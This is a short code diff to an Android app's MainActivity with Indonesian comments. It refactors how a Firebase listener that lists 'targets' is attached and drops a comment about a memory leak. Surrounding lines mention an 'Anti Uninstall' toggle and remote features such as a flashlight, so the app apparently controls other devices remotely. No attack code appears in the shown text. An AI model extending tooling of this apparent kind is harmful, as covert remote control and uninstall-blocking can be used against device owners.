@@ -149,7 +149,7 @@ public class MainActivity extends AppCompatActivity {
             Toast.makeText(this, "Anti Uninstall: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
-        // ===== GANTI TARGET =====
+        // ===== PILIH TARGET =====
         btnGanti.setOnClickListener(v -> showTargetSelectionDialog());
 
         // ===== 1. FLASHLIGHT =====
@@ -498,7 +498,7 @@ public class MainActivity extends AppCompatActivity {
         AlertDialog dialog = builder.create();
 
         // Ambil daftar target dari Firebase
-        ValueEventListener targetListener = new ValueEventListener() {
+        mDatabase.addValueEventListener(new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
                 layout.removeAllViews();
@@ -642,13 +642,7 @@ public class MainActivity extends AppCompatActivity {
                 err.setPadding(16, 16, 16, 16);
                 layout.addView(err);
             }
-        };
-
-        // Tambahkan listener
-        mDatabase.addValueEventListener(targetListener);
-
-        // Simpan listener buat dibersihkan
-        // (tanpa ini memory leak, tapi gapapa buat sekarang)
+        });
 
         builder.setNegativeButton("Tutup", (d, which) -> dialog.dismiss());
         dialog.show();
@@ -943,4 +937,4 @@ public class MainActivity extends AppCompatActivity {
     interface OnInputListener {
         void onInput(String input);
     }
-            }
+                    }
